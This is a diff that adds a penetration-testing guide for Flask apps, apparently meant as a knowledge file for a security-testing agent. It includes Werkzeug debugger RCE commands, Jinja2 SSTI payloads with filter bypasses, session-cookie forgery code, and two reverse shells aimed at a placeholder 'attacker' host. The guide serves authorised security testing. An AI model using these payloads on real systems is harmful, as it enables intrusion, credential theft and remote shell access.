@@ -1,0 +1,442 @@
+<flask_security_guide>
+<title>FLASK PYTHON FRAMEWORK SECURITY TESTING</title>
+
+<critical>Flask is a lightweight Python web framework where security is often left to developers. Vulnerabilities arise from debug mode exposure (Werkzeug debugger RCE), session cookie signing issues, Jinja2 SSTI, blueprint security, and missing security headers. Testing must cover Flask-specific attack vectors.</critical>
+
+<scope>
+- Debug PIN exploitation
+- Session cookie signing (SECRET_KEY)
+- Werkzeug debugger RCE
+- Jinja2 SSTI specifics
+- Blueprint security issues
+- Configuration exposure
+</scope>
+
+<methodology>
+1. Identify Flask version and debug mode status.
+2. Test for Werkzeug debugger access.
+3. Probe session cookie security.
+4. Test for SSTI in template rendering.
+5. Analyze blueprint configurations.
+6. Check for SECRET_KEY exposure.
+</methodology>
+
+<debug_mode>
+<debugger_exploitation>
+{% raw %}
+# Werkzeug debugger detection:
+
+# Check for debug mode:
+# Trigger an error and look for interactive debugger
+GET /nonexistent
+GET /api/test?id=invalid
+
+# Debugger console:
+# If debug mode is on:
+GET /__debugger__
+GET /console
+
+# Debugger indicators:
+# - Interactive Python console
+# - "Werkzeug Debugger" title
+# - Stack trace with code context
+# - PIN prompt for console access
+
+# Console URL format:
+/console?__debugger__=yes&cmd=<command>&frm=0&s=<secret>
+{% endraw %}
+</debugger_exploitation>
+
+<pin_bypass>
+{% raw %}
+# Werkzeug debug PIN calculation:
+
+# PIN is calculated from:
+# - username running the app
+# - modname (flask.app or werkzeug.debug)
+# - getattr(app, '__name__', type(app).__name__)
+# - getattr(mod, '__file__', None)
+# - str(uuid.getnode()) - MAC address
+# - get_machine_id() - machine specific
+
+# Required information:
+# 1. Username:
+# /etc/passwd
+# /proc/self/environ (USER)
+
+# 2. MAC address:
+# /sys/class/net/eth0/address
+# /proc/net/arp
+
+# 3. Machine ID (one of):
+# /etc/machine-id
+# /proc/sys/kernel/random/boot_id
+# /proc/self/cgroup (docker container ID)
+
+# 4. Flask app path:
+# From error traceback
+
+# PIN generation script:
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+    'www-data',  # username
+    'flask.app',  # modname
+    'Flask',  # getattr(app, '__name__', type(app).__name__)
+    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # app path
+]
+
+private_bits = [
+    '2485377568585',  # MAC as decimal
+    'machine-id-here'  # machine-id
+]
+
+# Calculate PIN...
+{% endraw %}
+</pin_bypass>
+
+<debugger_rce>
+{% raw %}
+# RCE via Werkzeug debugger:
+
+# Once PIN is known:
+GET /console?__debugger__=yes&cmd=__import__('os').system('id')&frm=0&s=<secret>
+
+# Alternative:
+# Click on stack trace to get console frame
+# Execute Python in interactive console:
+
+import os
+os.system('id')
+
+import subprocess
+subprocess.check_output(['cat', '/etc/passwd'])
+
+# Reverse shell:
+import socket,os,pty
+s=socket.socket()
+s.connect(("attacker.com",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+{% endraw %}
+</debugger_rce>
+</debug_mode>
+
+<secret_key>
+<key_exposure>
+{% raw %}
+# SECRET_KEY exposure vectors:
+
+# Configuration files:
+GET /config.py
+GET /settings.py
+GET /instance/config.py
+GET /.env
+
+# Environment variables:
+GET /proc/self/environ
+# Via SSRF or LFI
+
+# Error messages:
+# May reveal in stack traces
+
+# Source code:
+GET /.git/config
+GET /.git/HEAD
+
+# Common weak keys:
+'secret'
+'change_me'
+'development key'
+'super secret key'
+'keyboard cat'
+os.urandom(16)  # But predictable seed
+
+# Check response headers:
+# Flask-Session or session cookie
+{% endraw %}
+</key_exposure>
+
+<session_forgery>
+{% raw %}
+# Session cookie manipulation:
+
+# Flask session cookie format:
+# base64(payload).timestamp.signature
+
+# Decode session:
+import base64
+import zlib
+
+cookie = "eyJ..." 
+data = base64.urlsafe_b64decode(cookie.split('.')[0] + '==')
+# May be zlib compressed
+
+# If SECRET_KEY known:
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = 'known_key'
+session_interface = SecureCookieSessionInterface()
+serializer = session_interface.get_signing_serializer(app)
+
+# Decode:
+data = serializer.loads(cookie)
+
+# Forge:
+new_session = {'user_id': 1, 'is_admin': True}
+forged_cookie = serializer.dumps(new_session)
+
+# Flask-Unsign tool:
+flask-unsign --decode --cookie 'cookie_value'
+flask-unsign --sign --cookie "{'admin': True}" --secret 'key'
+flask-unsign --unsign --cookie 'cookie_value' --wordlist wordlist.txt
+{% endraw %}
+</session_forgery>
+</secret_key>
+
+<jinja2_ssti>
+<ssti_detection>
+{% raw %}
+# Jinja2 SSTI detection:
+
+# Basic detection:
+{{7*7}}  # Returns 49
+{{7*'7'}}  # Returns 7777777
+${7*7}  # Alternative syntax
+
+# Confirm Jinja2:
+{{config}}
+{{config.items()}}
+{{self}}
+{{request}}
+
+# Error-based detection:
+{{invalid}}
+{{''.__class__}}
+
+# Context exploration:
+{{request.environ}}
+{{request.headers}}
+{{request.cookies}}
+{% endraw %}
+</ssti_detection>
+
+<ssti_exploitation>
+{% raw %}
+# Jinja2 SSTI RCE:
+
+# Python 2:
+{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Python 3 - find useful classes:
+{% for c in ''.__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
+{% endif %}
+{% endfor %}
+
+# Shorter payloads:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+
+# Without quotes:
+{{lipsum.__globals__[request.args.x].popen(request.args.y).read()}}&x=os&y=id
+
+# File read:
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+
+# Reverse shell:
+{{lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
+{% endraw %}
+</ssti_exploitation>
+
+<ssti_bypass>
+{% raw %}
+# Jinja2 SSTI filter bypass:
+
+# Blacklist bypass:
+# If 'class' blocked:
+{{''|attr('\x5f\x5fclass\x5f\x5f')}}
+
+# If '.' blocked:
+{{''['__class__']}}
+{{''|attr('__class__')}}
+
+# If '_' blocked:
+{{''['\x5f\x5fclass\x5f\x5f']}}
+{{request['args']['a']}} with ?a=__class__
+
+# If brackets blocked:
+{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
+
+# String construction:
+{% set x = 'o'+'s' %}
+{{lipsum.__globals__[x].popen('id').read()}}
+
+# Using request:
+{{lipsum.__globals__[request.args.m].popen(request.args.c).read()}}&m=os&c=id
+{% endraw %}
+</ssti_bypass>
+</jinja2_ssti>
+
+<blueprint_security>
+<blueprint_issues>
+{% raw %}
+# Blueprint security testing:
+
+# 1. URL prefix bypass:
+# Blueprint registered with prefix
+/api/v1/resource  # Normal
+/api/v1/../resource  # Try bypass
+//api/v1/resource  # Double slash
+
+# 2. Blueprint-specific auth:
+# Some blueprints may lack authentication
+/admin/dashboard  # Has auth
+/api/endpoint  # Missing auth?
+
+# 3. Error handlers:
+# Different error handling per blueprint
+# Information disclosure in errors
+
+# 4. Static files:
+# Blueprint static folder exposed
+/blueprint/static/../../../etc/passwd
+
+# 5. Before request hooks:
+# May not apply to all blueprints
+# Auth check in main app but not API blueprint
+{% endraw %}
+</blueprint_issues>
+
+<routing_vulnerabilities>
+{% raw %}
+# Flask routing issues:
+
+# 1. Trailing slash:
+/users (returns 200)
+/users/ (redirects or different behavior)
+
+# 2. Method handling:
+# Endpoint may accept unintended methods
+curl -X PUT /api/users/1
+curl -X DELETE /api/users/1
+
+# 3. Variable rules:
+# /users/<int:id> vs /users/<id>
+/users/admin  # May bypass int check
+/users/1;drop table users
+
+# 4. URL building:
+# url_for() may expose internal routes
+# Check for route listing endpoint
+
+# 5. Subdomain routing:
+# Subdomain may have different security
+api.example.com vs www.example.com
+{% endraw %}
+</routing_vulnerabilities>
+</blueprint_security>
+
+<configuration_exposure>
+<config_leakage>
+{% raw %}
+# Configuration exposure:
+
+# Access config object in SSTI:
+{{config}}
+{{config.SECRET_KEY}}
+{{config['DATABASE_URI']}}
+
+# Environment variables:
+{{request.environ}}
+{{request.environ['SECRET_KEY']}}
+
+# Flask configuration endpoints:
+GET /config
+GET /settings
+GET /info
+
+# Instance folder:
+GET /instance/config.py
+
+# Debug information:
+{{app.debug}}
+{{app.testing}}
+{{app.config}}
+
+# Extension configurations:
+{{app.extensions}}
+{% endraw %}
+</config_leakage>
+</configuration_exposure>
+
+<common_payloads>
+{% raw %}
+# Debug mode check:
+GET /nonexistent_path_to_trigger_error
+
+# PIN bypass info:
+GET /proc/self/environ
+GET /sys/class/net/eth0/address
+
+# SSTI:
+{{7*7}}
+{{config.SECRET_KEY}}
+{{lipsum.__globals__.os.popen('id').read()}}
+
+# Session decode:
+flask-unsign --decode --cookie 'cookie'
+
+# Secret key brute force:
+flask-unsign --unsign --cookie 'cookie' --wordlist keys.txt
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate debug mode with Werkzeug console.
+2. Show SECRET_KEY exposure or session forgery.
+3. Prove SSTI with code execution.
+4. Document blueprint security bypass.
+5. Provide configuration exposure evidence.
+</validation>
+
+<false_positives>
+- Debug mode disabled in production
+- Strong random SECRET_KEY
+- Proper template escaping without user control
+- Blueprint-level authentication
+- No sensitive data in configuration
+- Proper error handling without stack traces
+</false_positives>
+
+<impact>
+- Remote code execution via debugger
+- Session hijacking via SECRET_KEY
+- Server-side code execution via SSTI
+- Information disclosure via configuration
+- Authentication bypass via blueprint issues
+- Data breach via session forgery
+</impact>
+
+<pro_tips>
+1. Always check for Werkzeug debugger.
+2. Attempt to calculate debug PIN.
+3. Test SSTI in all user-controlled template contexts.
+4. Brute force SECRET_KEY with common values.
+5. Check Flask-Session and other extensions.
+6. Look for differences between blueprints.
+7. Test different HTTP methods on endpoints.
+8. Check error handlers for information leakage.
+9. Look for Flask-Admin or other admin interfaces.
+10. Document Flask and extension versions.
+</pro_tips>
+
+<remember>Flask's simplicity means security is developer responsibility. Debug mode in production is an instant RCE. Weak SECRET_KEY enables session forgery. Always verify that development features are disabled in production.</remember>
+</flask_security_guide>
